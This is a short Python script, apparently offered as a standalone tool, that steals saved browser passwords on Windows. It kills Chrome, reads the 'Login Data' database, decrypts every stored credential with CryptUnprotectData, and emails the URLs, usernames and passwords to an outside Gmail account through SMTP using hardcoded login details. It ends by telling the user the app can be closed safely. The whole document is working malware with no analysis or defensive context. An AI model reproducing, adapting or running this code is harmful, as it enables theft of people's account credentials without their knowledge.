import subprocess,os
def CP():
    import sqlite3,win32crypt
    try:
        subprocess.getoutput('taskkill /f /im "chrome.exe"')
        c = sqlite3.connect(os.path.join(os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Login Data'))
        cursor = c.cursor()
        try: cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        except: print('404.1 Error')
        credential = {}
        for url, user_name, pwd, in cursor.fetchall():
            try:
                pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
                credential[url] = (user_name, pwd[1])
            except: pass
        if len(credential):
            print('CPG:Done')
            ret= ''
            for url, credentials in credential.items():
                if credentials[1]:
                    ret+= ("\n"+str(url)+"\n"+str(credentials[0].encode('utf-8'))+ " | "+str(credentials[1])+"\n")
            return ret
        else: print('404.2 Error\n')
    except: print('404.3 Error\n')
RET= CP()


import smtplib 
s = smtplib.SMTP('smtp.gmail.com', 587) 
s.starttls() 
s.login("rawmin.rx@gmail.com", "askaramp.r.e") 
message = RET
s.sendmail("rawmin.rx@gmail.com", "raminj.rx7@gmail.com", str('WS-PASSWORDS:\n'+message))
s.quit()
print('SE:Done')
import os
try: os.remove('null')
except: pass
print('You can close the app safely')
